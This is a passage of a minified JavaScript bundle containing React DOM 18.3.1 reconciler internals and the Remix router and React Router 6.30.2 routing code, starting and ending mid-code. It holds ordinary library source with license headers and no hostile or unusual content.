0?(n.tag=1,n.memoizedState=null,n.updateQueue=null,Ce(s)?(i=!0,Hr(n)):i=!1,n.memoizedState=r.state!==null&&r.state!==void 0?r.state:null,zl(n),r.updater=yi,n.stateNode=r,r._reactInternals=n,za(n,s,e,t),n=Fa(null,n,s,!0,i,t)):(n.tag=0,K&&i&&Ll(n),we(null,n,r,t),n=n.child),n;case 16:s=n.elementType;e:{switch(_r(e,n),e=n.pendingProps,r=s._init,s=r(s._payload),n.type=s,r=n.tag=bm(s),e=We(s,e),r){case 0:n=Ba(null,n,s,e,t);break e;case 1:n=dc(null,n,s,e,t);break e;case 11:n=uc(null,n,s,e,t);break e;case 14:n=pc(null,n,s,We(s.type,e),t);break e}throw Error(P(306,s,""))}return n;case 0:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:We(s,r),Ba(e,n,s,r,t);case 1:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:We(s,r),dc(e,n,s,r,t);case 3:e:{if($p(n),e===null)throw Error(P(387));s=n.pendingProps,i=n.memoizedState,r=i.element,vp(e,n),Yr(n,s,null,t);var a=n.memoizedState;if(s=a.element,i.isDehydrated)if(i={element:s,isDehydrated:!1,cache:a.cache,pendingSuspenseBoundaries:a.pendingSuspenseBoundaries,transitions:a.transitions},n.updateQueue.baseState=i,n.memoizedState=i,n.flags&256){r=zt(Error(P(423)),n),n=hc(e,n,s,t,r);break e}else if(s!==r){r=zt(Error(P(424)),n),n=hc(e,n,s,t,r);break e}else for(Le=On(n.stateNode.containerInfo.firstChild),Ne=n,K=!0,Ge=null,t=gp(n,null,s,t),n.child=t;t;)t.flags=t.flags&-3|4096,t=t.sibling;else{if(Mt(),s===r){n=gn(e,n,t);break e}we(e,n,s,t)}n=n.child}return n;case 5:return wp(n),e===null&&Ma(n),s=n.type,r=n.pendingProps,i=e!==null?e.memoizedProps:null,a=r.children,Aa(s,r)?a=null:i!==null&&Aa(s,i)&&(n.flags|=32),Wp(e,n),we(e,n,a,t),n.child;case 6:return e===null&&Ma(n),null;case 13:return Gp(e,n,t);case 4:return jl(n,n.stateNode.containerInfo),s=n.pendingProps,e===null?n.child=It(n,null,s,t):we(e,n,s,t),n.child;case 11:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:We(s,r),uc(e,n,s,r,t);case 7:return we(e,n,n.pendingProps,t),n.child;case 8:return we(e,n,n.pendingProps.children,t),n.child;case 12:return we(e,n,n.pendingProps.children,t),n.child;case 10:e:{if(s=n.type._context,r=n.pendingProps,i=n.memoizedProps,a=r.value,Y($r,s._currentValue),s._currentValue=a,i!==null)if(Ke(i.value,a)){if(i.children===r.children&&!Te.current){n=gn(e,n,t);break e}}else for(i=n.child,i!==null&&(i.return=n);i!==null;){var l=i.dependencies;if(l!==null){a=i.child;for(var o=l.firstContext;o!==null;){if(o.context===s){if(i.tag===1){o=dn(-1,t&-t),o.tag=2;var c=i.updateQueue;if(c!==null){c=c.shared;var u=c.pending;u===null?o.next=o:(o.next=u.next,u.next=o),c.pending=o}}i.lanes|=t,o=i.alternate,o!==null&&(o.lanes|=t),Ia(i.return,t,n),l.lanes|=t;break}o=o.next}}else if(i.tag===10)a=i.type===n.type?null:i.child;else if(i.tag===18){if(a=i.return,a===null)throw Error(P(341));a.lanes|=t,l=a.alternate,l!==null&&(l.lanes|=t),Ia(a,t,n),a=i.sibling}else a=i.child;if(a!==null)a.return=i;else for(a=i;a!==null;){if(a===n){a=null;break}if(i=a.sibling,i!==null){i.return=a.return,a=i;break}a=a.return}i=a}we(e,n,r.children,t),n=n.child}return n;case 9:return r=n.type,s=n.pendingProps.children,Pt(n,t),r=Fe(r),s=s(r),n.flags|=1,we(e,n,s,t),n.child;case 14:return s=n.type,r=We(s,n.pendingProps),r=We(s.type,r),pc(e,n,s,r,t);case 15:return Hp(e,n,n.type,n.pendingProps,t);case 17:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:We(s,r),_r(e,n),n.tag=1,Ce(s)?(e=!0,Hr(n)):e=!1,Pt(n,t),Bp(n,s,r),za(n,s,r,t),Fa(null,n,s,!0,e,t);case 19:return Yp(e,n,t);case 22:return Vp(e,n,t)}throw Error(P(156,n.tag))};function cd(e,n){return Du(e,n)}function km(e,n,t,s){this.tag=e,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=n,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=s,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function je(e,n,t,s){return new km(e,n,t,s)}function Jl(e){return e=e.prototype,!(!e||!e.isReactComponent)}function bm(e){if(typeof e=="function")return Jl(e)?1:0;if(e!=null){if(e=e.$$typeof,e===vl)return 11;if(e===wl)return 14}return 2}function zn(e,n){var t=e.alternate;return t===null?(t=je(e.tag,n,e.key,e.mode),t.elementType=e.elementType,t.type=e.type,t.stateNode=e.stateNode,t.alternate=e,e.alternate=t):(t.pendingProps=n,t.type=e.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=e.flags&14680064,t.childLanes=e.childLanes,t.lanes=e.lanes,t.child=e.child,t.memoizedProps=e.memoizedProps,t.memoizedState=e.memoizedState,t.updateQueue=e.updateQueue,n=e.dependencies,t.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext},t.sibling=e.sibling,t.index=e.index,t.ref=e.ref,t}function Cr(e,n,t,s,r,i){var a=2;if(s=e,typeof e=="function")Jl(e)&&(a=1);else if(typeof e=="string")a=5;else e:switch(e){case dt:return Jn(t.children,r,i,n);case yl:a=8,r|=8;break;case la:return e=je(12,t,n,r|2),e.elementType=la,e.lanes=i,e;case oa:return e=je(13,t,n,r),e.elementType=oa,e.lanes=i,e;case ca:return e=je(19,t,n,r),e.elementType=ca,e.lanes=i,e;case wu:return ki(t,r,i,n);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case yu:a=10;break e;case vu:a=9;break e;case vl:a=11;break e;case wl:a=14;break e;case bn:a=16,s=null;break e}throw Error(P(130,e==null?e:typeof e,""))}return n=je(a,t,n,r),n.elementType=e,n.type=s,n.lanes=i,n}function Jn(e,n,t,s){return e=je(7,e,s,n),e.lanes=t,e}function ki(e,n,t,s){return e=je(22,e,s,n),e.elementType=wu,e.lanes=t,e.stateNode={isHidden:!1},e}function ea(e,n,t){return e=je(6,e,null,n),e.lanes=t,e}function na(e,n,t){return n=je(4,e.children!==null?e.children:[],e.key,n),n.lanes=t,n.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},n}function xm(e,n,t,s,r){this.tag=n,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Ii(0),this.expirationTimes=Ii(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Ii(0),this.identifierPrefix=s,this.onRecoverableError=r,this.mutableSourceEagerHydrationData=null}function eo(e,n,t,s,r,i,a,l,o){return e=new xm(e,n,t,l,o),n===1?(n=1,i===!0&&(n|=8)):n=0,i=je(3,null,null,n),e.current=i,i.stateNode=e,i.memoizedState={element:s,isDehydrated:t,cache:null,transitions:null,pendingSuspenseBoundaries:null},zl(i),e}function Sm(e,n,t){var s=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:pt,key:s==null?null:""+s,children:e,containerInfo:n,implementation:t}}function ud(e){if(!e)return Fn;e=e._reactInternals;e:{if(ot(e)!==e||e.tag!==1)throw Error(P(170));var n=e;do{switch(n.tag){case 3:n=n.stateNode.context;break e;case 1:if(Ce(n.type)){n=n.stateNode.__reactInternalMemoizedMergedChildContext;break e}}n=n.return}while(n!==null);throw Error(P(171))}if(e.tag===1){var t=e.type;if(Ce(t))return up(e,t,n)}return n}function pd(e,n,t,s,r,i,a,l,o){return e=eo(t,s,!0,e,r,i,a,l,o),e.context=ud(null),t=e.current,s=ke(),r=Dn(t),i=dn(s,r),i.callback=n??null,Mn(t,i,r),e.current.lanes=r,Us(e,r,s),Pe(e,s),e}function bi(e,n,t,s){var r=n.current,i=ke(),a=Dn(r);return t=ud(t),n.context===null?n.context=t:n.pendingContext=t,n=dn(i,a),n.payload={element:e},s=s===void 0?null:s,s!==null&&(n.callback=s),e=Mn(r,n,a),e!==null&&(Xe(e,r,a,i),br(e,r,a)),a}function ni(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function Sc(e,n){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var t=e.retryLane;e.retryLane=t!==0&&t<n?t:n}}function no(e,n){Sc(e,n),(e=e.alternate)&&Sc(e,n)}function _m(){return null}var dd=typeof reportError=="function"?reportError:function(e){console.error(e)};function to(e){this._internalRoot=e}xi.prototype.render=to.prototype.render=function(e){var n=this._internalRoot;if(n===null)throw Error(P(409));bi(e,n,null,null)};xi.prototype.unmount=to.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var n=e.containerInfo;it(function(){bi(null,e,null,null)}),n[fn]=null}};function xi(e){this._internalRoot=e}xi.prototype.unstable_scheduleHydration=function(e){if(e){var n=Vu();e={blockedOn:null,target:e,priority:n};for(var t=0;t<_n.length&&n!==0&&n<_n[t].priority;t++);_n.splice(t,0,e),t===0&&$u(e)}};function so(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Si(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function _c(){}function Em(e,n,t,s,r){if(r){if(typeof s=="function"){var i=s;s=function(){var c=ni(a);i.call(c)}}var a=pd(n,s,e,0,null,!1,!1,"",_c);return e._reactRootContainer=a,e[fn]=a.current,Es(e.nodeType===8?e.parentNode:e),it(),a}for(;r=e.lastChild;)e.removeChild(r);if(typeof s=="function"){var l=s;s=function(){var c=ni(o);l.call(c)}}var o=eo(e,0,!1,null,null,!1,!1,"",_c);return e._reactRootContainer=o,e[fn]=o.current,Es(e.nodeType===8?e.parentNode:e),it(function(){bi(n,o,t,s)}),o}function _i(e,n,t,s,r){var i=t._reactRootContainer;if(i){var a=i;if(typeof r=="function"){var l=r;r=function(){var o=ni(a);l.call(o)}}bi(n,a,e,r)}else a=Em(t,n,e,r,s);return ni(a)}Uu=function(e){switch(e.tag){case 3:var n=e.stateNode;if(n.current.memoizedState.isDehydrated){var t=rs(n.pendingLanes);t!==0&&(xl(n,t|1),Pe(n,ne()),!(V&6)&&(jt=ne()+500,Vn()))}break;case 13:it(function(){var s=mn(e,1);if(s!==null){var r=ke();Xe(s,e,1,r)}}),no(e,1)}};Sl=function(e){if(e.tag===13){var n=mn(e,134217728);if(n!==null){var t=ke();Xe(n,e,134217728,t)}no(e,134217728)}};Hu=function(e){if(e.tag===13){var n=Dn(e),t=mn(e,n);if(t!==null){var s=ke();Xe(t,e,n,s)}no(e,n)}};Vu=function(){return G};Wu=function(e,n){var t=G;try{return G=e,n()}finally{G=t}};wa=function(e,n,t){switch(n){case"input":if(da(e,t),n=t.name,t.type==="radio"&&n!=null){for(t=e;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll("input[name="+JSON.stringify(""+n)+'][type="radio"]'),n=0;n<t.length;n++){var s=t[n];if(s!==e&&s.form===e.form){var r=fi(s);if(!r)throw Error(P(90));bu(s),da(s,r)}}}break;case"textarea":Su(e,t);break;case"select":n=t.value,n!=null&&_t(e,!!t.multiple,n,!1)}};Lu=Kl;Nu=it;var Tm={usingClientEntryPoint:!1,Events:[Vs,gt,fi,Pu,Au,Kl]},Jt={findFiberByHostInstance:qn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Cm={bundleType:Jt.bundleType,version:Jt.version,rendererPackageName:Jt.rendererPackageName,rendererConfig:Jt.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:vn.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=Mu(e),e===null?null:e.stateNode},findFiberByHostInstance:Jt.findFiberByHostInstance||_m,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var pr=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!pr.isDisabled&&pr.supportsFiber)try{ui=pr.inject(Cm),nn=pr}catch{}}Me.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Tm;Me.createPortal=function(e,n){var t=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!so(n))throw Error(P(200));return Sm(e,n,null,t)};Me.createRoot=function(e,n){if(!so(e))throw Error(P(299));var t=!1,s="",r=dd;return n!=null&&(n.unstable_strictMode===!0&&(t=!0),n.identifierPrefix!==void 0&&(s=n.identifierPrefix),n.onRecoverableError!==void 0&&(r=n.onRecoverableError)),n=eo(e,1,!1,null,null,t,!1,s,r),e[fn]=n.current,Es(e.nodeType===8?e.parentNode:e),new to(n)};Me.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var n=e._reactInternals;if(n===void 0)throw typeof e.render=="function"?Error(P(188)):(e=Object.keys(e).join(","),Error(P(268,e)));return e=Mu(n),e=e===null?null:e.stateNode,e};Me.flushSync=function(e){return it(e)};Me.hydrate=function(e,n,t){if(!Si(n))throw Error(P(200));return _i(null,e,n,!0,t)};Me.hydrateRoot=function(e,n,t){if(!so(e))throw Error(P(405));var s=t!=null&&t.hydratedSources||null,r=!1,i="",a=dd;if(t!=null&&(t.unstable_strictMode===!0&&(r=!0),t.identifierPrefix!==void 0&&(i=t.identifierPrefix),t.onRecoverableError!==void 0&&(a=t.onRecoverableError)),n=pd(n,null,e,1,t??null,r,!1,i,a),e[fn]=n.current,Es(e),s)for(e=0;e<s.length;e++)t=s[e],r=t._getVersion,r=r(t._source),n.mutableSourceEagerHydrationData==null?n.mutableSourceEagerHydrationData=[t,r]:n.mutableSourceEagerHydrationData.push(t,r);return new xi(n)};Me.render=function(e,n,t){if(!Si(n))throw Error(P(200));return _i(null,e,n,!1,t)};Me.unmountComponentAtNode=function(e){if(!Si(e))throw Error(P(40));return e._reactRootContainer?(it(function(){_i(null,null,e,!1,function(){e._reactRootContainer=null,e[fn]=null})}),!0):!1};Me.unstable_batchedUpdates=Kl;Me.unstable_renderSubtreeIntoContainer=function(e,n,t,s){if(!Si(t))throw Error(P(200));if(e==null||e._reactInternals===void 0)throw Error(P(38));return _i(e,n,t,!1,s)};Me.version="18.3.1-next-f1338f8080-20240426";function hd(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(hd)}catch(e){console.error(e)}}hd(),hu.exports=Me;var Pm=hu.exports,fd,Ec=Pm;fd=Ec.createRoot,Ec.hydrateRoot;/**
 * @remix-run/router v1.23.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ms(){return Ms=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},Ms.apply(this,arguments)}var An;(function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"})(An||(An={}));const Tc="popstate";function Am(e){e===void 0&&(e={});function n(s,r){let{pathname:i,search:a,hash:l}=s.location;return Za("",{pathname:i,search:a,hash:l},r.state&&r.state.usr||null,r.state&&r.state.key||"default")}function t(s,r){return typeof r=="string"?r:ti(r)}return Nm(n,t,null,e)}function re(e,n){if(e===!1||e===null||typeof e>"u")throw new Error(n)}function ro(e,n){if(!e){typeof console<"u"&&console.warn(n);try{throw new Error(n)}catch{}}}function Lm(){return Math.random().toString(36).substr(2,8)}function Cc(e,n){return{usr:e.state,key:e.key,idx:n}}function Za(e,n,t,s){return t===void 0&&(t=null),Ms({pathname:typeof e=="string"?e:e.pathname,search:"",hash:""},typeof n=="string"?Wt(n):n,{state:t,key:n&&n.key||s||Lm()})}function ti(e){let{pathname:n="/",search:t="",hash:s=""}=e;return t&&t!=="?"&&(n+=t.charAt(0)==="?"?t:"?"+t),s&&s!=="#"&&(n+=s.charAt(0)==="#"?s:"#"+s),n}function Wt(e){let n={};if(e){let t=e.indexOf("#");t>=0&&(n.hash=e.substr(t),e=e.substr(0,t));let s=e.indexOf("?");s>=0&&(n.search=e.substr(s),e=e.substr(0,s)),e&&(n.pathname=e)}return n}function Nm(e,n,t,s){s===void 0&&(s={});let{window:r=document.defaultView,v5Compat:i=!1}=s,a=r.history,l=An.Pop,o=null,c=u();c==null&&(c=0,a.replaceState(Ms({},a.state,{idx:c}),""));function u(){return(a.state||{idx:null}).idx}function d(){l=An.Pop;let A=u(),p=A==null?null:A-c;c=A,o&&o({action:l,location:x.location,delta:p})}function h(A,p){l=An.Push;let f=Za(x.location,A,p);c=u()+1;let m=Cc(f,c),S=x.createHref(f);try{a.pushState(m,"",S)}catch(T){if(T instanceof DOMException&&T.name==="DataCloneError")throw T;r.location.assign(S)}i&&o&&o({action:l,location:x.location,delta:1})}function v(A,p){l=An.Replace;let f=Za(x.location,A,p);c=u();let m=Cc(f,c),S=x.createHref(f);a.replaceState(m,"",S),i&&o&&o({action:l,location:x.location,delta:0})}function k(A){let p=r.location.origin!=="null"?r.location.origin:r.location.href,f=typeof A=="string"?A:ti(A);return f=f.replace(/ $/,"%20"),re(p,"No window.location.(origin|href) available to create URL for href: "+f),new URL(f,p)}let x={get action(){return l},get location(){return e(r,a)},listen(A){if(o)throw new Error("A history only accepts one active listener");return r.addEventListener(Tc,d),o=A,()=>{r.removeEventListener(Tc,d),o=null}},createHref(A){return n(r,A)},createURL:k,encodeLocation(A){let p=k(A);return{pathname:p.pathname,search:p.search,hash:p.hash}},push:h,replace:v,go(A){return a.go(A)}};return x}var Pc;(function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"})(Pc||(Pc={}));function Rm(e,n,t){return t===void 0&&(t="/"),Om(e,n,t)}function Om(e,n,t,s){let r=typeof n=="string"?Wt(n):n,i=io(r.pathname||"/",t);if(i==null)return null;let a=md(e);Mm(a);let l=null;for(let o=0;l==null&&o<a.length;++o){let c=Gm(i);l=Vm(a[o],c)}return l}function md(e,n,t,s){n===void 0&&(n=[]),t===void 0&&(t=[]),s===void 0&&(s="");let r=(i,a,l)=>{let o={relativePath:l===void 0?i.path||"":l,caseSensitive:i.caseSensitive===!0,childrenIndex:a,route:i};o.relativePath.startsWith("/")&&(re(o.relativePath.startsWith(s),'Absolute route path "'+o.relativePath+'" nested under path '+('"'+s+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),o.relativePath=o.relativePath.slice(s.length));let c=jn([s,o.relativePath]),u=t.concat(o);i.children&&i.children.length>0&&(re(i.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+c+'".')),md(i.children,n,u,c)),!(i.path==null&&!i.index)&&n.push({path:c,score:Um(c,i.index),routesMeta:u})};return e.forEach((i,a)=>{var l;if(i.path===""||!((l=i.path)!=null&&l.includes("?")))r(i,a);else for(let o of gd(i.path))r(i,a,o)}),n}function gd(e){let n=e.split("/");if(n.length===0)return[];let[t,...s]=n,r=t.endsWith("?"),i=t.replace(/\?$/,"");if(s.length===0)return r?[i,""]:[i];let a=gd(s.join("/")),l=[];return l.push(...a.map(o=>o===""?i:[i,o].join("/"))),r&&l.push(...a),l.map(o=>e.startsWith("/")&&o===""?"/":o)}function Mm(e){e.sort((n,t)=>n.score!==t.score?t.score-n.score:Hm(n.routesMeta.map(s=>s.childrenIndex),t.routesMeta.map(s=>s.childrenIndex)))}const Im=/^:[\w-]+$/,Dm=3,zm=2,jm=1,Bm=10,Fm=-2,Ac=e=>e==="*";function Um(e,n){let t=e.split("/"),s=t.length;return t.some(Ac)&&(s+=Fm),n&&(s+=zm),t.filter(r=>!Ac(r)).reduce((r,i)=>r+(Im.test(i)?Dm:i===""?jm:Bm),s)}function Hm(e,n){return e.length===n.length&&e.slice(0,-1).every((s,r)=>s===n[r])?e[e.length-1]-n[n.length-1]:0}function Vm(e,n,t){let{routesMeta:s}=e,r={},i="/",a=[];for(let l=0;l<s.length;++l){let o=s[l],c=l===s.length-1,u=i==="/"?n:n.slice(i.length)||"/",d=Wm({path:o.relativePath,caseSensitive:o.caseSensitive,end:c},u),h=o.route;if(!d)return null;Object.assign(r,d.params),a.push({params:r,pathname:jn([i,d.pathname]),pathnameBase:Qm(jn([i,d.pathnameBase])),route:h}),d.pathnameBase!=="/"&&(i=jn([i,d.pathnameBase]))}return a}function Wm(e,n){typeof e=="string"&&(e={path:e,caseSensitive:!1,end:!0});let[t,s]=$m(e.path,e.caseSensitive,e.end),r=n.match(t);if(!r)return null;let i=r[0],a=i.replace(/(.)\/+$/,"$1"),l=r.slice(1);return{params:s.reduce((c,u,d)=>{let{paramName:h,isOptional:v}=u;if(h==="*"){let x=l[d]||"";a=i.slice(0,i.length-x.length).replace(/(.)\/+$/,"$1")}const k=l[d];return v&&!k?c[h]=void 0:c[h]=(k||"").replace(/%2F/g,"/"),c},{}),pathname:i,pathnameBase:a,pattern:e}}function $m(e,n,t){n===void 0&&(n=!1),t===void 0&&(t=!0),ro(e==="*"||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were '+('"'+e.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+e.replace(/\*$/,"/*")+'".'));let s=[],r="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(a,l,o)=>(s.push({paramName:l,isOptional:o!=null}),o?"/?([^\\/]+)?":"/([^\\/]+)"));return e.endsWith("*")?(s.push({paramName:"*"}),r+=e==="*"||e==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):t?r+="\\/*$":e!==""&&e!=="/"&&(r+="(?:(?=\\/|$))"),[new RegExp(r,n?void 0:"i"),s]}function Gm(e){try{return e.split("/").map(n=>decodeURIComponent(n).replace(/\//g,"%2F")).join("/")}catch(n){return ro(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+n+").")),e}}function io(e,n){if(n==="/")return e;if(!e.toLowerCase().startsWith(n.toLowerCase()))return null;let t=n.endsWith("/")?n.length-1:n.length,s=e.charAt(t);return s&&s!=="/"?null:e.slice(t)||"/"}const Ym=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,qm=e=>Ym.test(e);function Xm(e,n){n===void 0&&(n="/");let{pathname:t,search:s="",hash:r=""}=typeof e=="string"?Wt(e):e,i;if(t)if(qm(t))i=t;else{if(t.includes("//")){let a=t;t=t.replace(/\/\/+/g,"/"),ro(!1,"Pathnames cannot have embedded double slashes - normalizing "+(a+" -> "+t))}t.startsWith("/")?i=Lc(t.substring(1),"/"):i=Lc(t,n)}else i=n;return{pathname:i,search:Zm(s),hash:Jm(r)}}function Lc(e,n){let t=n.replace(/\/+$/,"").split("/");return e.split("/").forEach(r=>{r===".."?t.length>1&&t.pop():r!=="."&&t.push(r)}),t.length>1?t.join("/"):"/"}function ta(e,n,t,s){return"Cannot include a '"+e+"' character in a manually specified "+("`to."+n+"` field ["+JSON.stringify(s)+"].  Please separate it out to the ")+("`to."+t+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function Km(e){return e.filter((n,t)=>t===0||n.route.path&&n.route.path.length>0)}function yd(e,n){let t=Km(e);return n?t.map((s,r)=>r===t.length-1?s.pathname:s.pathnameBase):t.map(s=>s.pathnameBase)}function vd(e,n,t,s){s===void 0&&(s=!1);let r;typeof e=="string"?r=Wt(e):(r=Ms({},e),re(!r.pathname||!r.pathname.includes("?"),ta("?","pathname","search",r)),re(!r.pathname||!r.pathname.includes("#"),ta("#","pathname","hash",r)),re(!r.search||!r.search.includes("#"),ta("#","search","hash",r)));let i=e===""||r.pathname==="",a=i?"/":r.pathname,l;if(a==null)l=t;else{let d=n.length-1;if(!s&&a.startsWith("..")){let h=a.split("/");for(;h[0]==="..";)h.shift(),d-=1;r.pathname=h.join("/")}l=d>=0?n[d]:"/"}let o=Xm(r,l),c=a&&a!=="/"&&a.endsWith("/"),u=(i||a===".")&&t.endsWith("/");return!o.pathname.endsWith("/")&&(c||u)&&(o.pathname+="/"),o}const jn=e=>e.join("/").replace(/\/\/+/g,"/"),Qm=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),Zm=e=>!e||e==="?"?"":e.startsWith("?")?e:"?"+e,Jm=e=>!e||e==="#"?"":e.startsWith("#")?e:"#"+e;function eg(e){return e!=null&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.internal=="boolean"&&"data"in e}const wd=["post","put","patch","delete"];new Set(wd);const ng=["get",...wd];new Set(ng);/**
 * React Router v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Is(){return Is=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},Is.apply(this,arguments)}const ao=C.createContext(null),tg=C.createContext(null),ct=C.createContext(null),Ei=C.createContext(null),Wn=C.createContext({outlet:null,matches:[],isDataRoute:!1}),kd=C.createContext(null);function sg(e,n){let{relative:t}=n===void 0?{}:n;$s()||re(!1);let{basename:s,navigator:r}=C.useContext(ct),{hash:i,pathname:a,search:l}=Sd(e,{relative:t}),o=a;return s!=="/"&&(o=a==="/"?s:jn([s,a])),r.createHref({pathname:o,search:l,hash:i})}function $s(){return C.useContext(Ei)!=null}function Gs(){return $s()||re(!1),C.useContext(Ei).location}function bd(e){C.useContext(ct).static||C.useLayoutEffect(e)}function xd(){let{isDataRoute:e}=C.useContext(Wn);return e?yg():rg()}function rg(){$s()||re(!1);let e=C.useContext(ao),{basename:n,future:t,navigator:s}=C.useContext(ct),{matches:r}=C.useContext(Wn),{pathname:i}=Gs(),a=JSON.stringify(yd(r,t.v7_relativeSplatPath)),l=C.useRef(!1);return bd(()=>{l.current=!0}),C.useCallback(function(c,u){if(u===void 0&&(u={}),!l.current)return;if(typeof c=="number"){s.go(c);return}let d=vd(c,JSON.parse(a),i,u.relative==="path");e==null&&n!=="/"&&(d.pathname=d.pathname==="/"?n:jn([n,d.pathname])),(u.replace?s.replace:s.push)(d,u.state,u)},[n,s,a,i,e])}function ig(){let{matches:e}=C.useContext(Wn),n=e[e.length-1];return n?n.params:{}}function Sd(e,n){let{relative:t}=n===void 0?{}:n,{future:s}=C.useContext(ct),{matches:r}=C.useContext(Wn),{pathname:i}=Gs(),a=JSON.stringify(yd(r,s.v7_relativeSplatPath));return C.useMemo(()=>vd(e,JSON.parse(a),i,t==="path"),[e,a,i,t])}function ag(e,n){return lg(e,n)}function lg(e,n,t,s){$s()||re(!1);let{navigator:r}=C.useContext(ct),{matches:i}=C.useContext(Wn),a=i[i.length-1],l=a?a.params:{};a&&a.pathname;let o=a?a.pathnameBase:"/";a&&a.route;let c=Gs(),u;if(n){var d;let A=typeof n=="string"?Wt(n):n;o==="/"||(d=A.pathname)!=null&&d.startsWith(o)||re(!1),u=A}else u=c;let h=u.pathname||"/",v=h;if(o!=="/"){let A=o.replace(/^\//,"").split("/");v="/"+h.replace(/^\//,"").split("/").slice(A.length).join("/")}let k=Rm(e,{pathname:v}),x=dg(k&&k.map(A=>Object.assign({},A,{params:Object.assign({},l,A.params),pathname:jn([o,r.encodeLocation?r.encodeLocation(A.pathname).pathname:A.pathname]),pathnameBase:A.pathnameBase==="/"?o:jn([o,r.encodeLocation?r.encodeLocation(A.pathnameBase).pathname:A.pathnameBase])})),i,t,s);return n&&x?C.createElement(Ei.Provider,{value:{location:Is({pathname:"/",search:"",hash:"",state:null,key:"default"},u),navigationType:An.Pop}},x):x}function og(){let e=gg(),n=eg(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),t=e instanceof Error?e.stack:null,r={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return C.createElement(C.Fragment,null,C.createElement("h2",null,"Unexpected Application Error!"),C.createElement("h3",{style:{fontStyle:"italic"}},n),t?C.createElement("pre",{style:r},t):null,null)}const cg=C.createElement(og,null);class ug extends C.Component{constructor(n){super(n),this.state={location:n.location,revalidation:n.revalidation,error:n.error}}static getDerivedStateFromError(n){return{error:n}}static getDerivedStateFromProps(n,t){return t.location!==n.location||t.revalidation!=="idle"&&n.revalidation==="idle"?{error:n.error,location:n.location,revalidation:n.revalidation}:{error:n.error!==void 0?n.error:t.error,location:t.location,revalidation:n.revalidation||t.revalidation}}componentDidCatch(n,t){console.error("React Router caught the following error during render",n,t)}render(){return this.state.error!==void 